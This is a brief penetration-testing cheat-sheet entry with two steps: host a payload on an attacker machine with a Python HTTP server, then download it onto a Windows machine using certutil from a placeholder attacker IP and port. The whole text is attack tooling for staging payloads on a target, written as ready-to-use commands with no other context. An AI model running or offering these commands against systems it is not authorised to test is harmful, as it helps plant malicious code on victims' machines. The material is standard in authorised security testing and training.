#### 01 Hosting file in Attacker Machine
- Host your payload in your `Pentest` Machine
```bash
$ python3 -m http.server
```
#### 02 Download the file in Windows Machine
```powershell
PS> certutil -urlcache -split -f http://<Attacker_IP>:<Port>/payload.name C:\temp\payload.name 
```
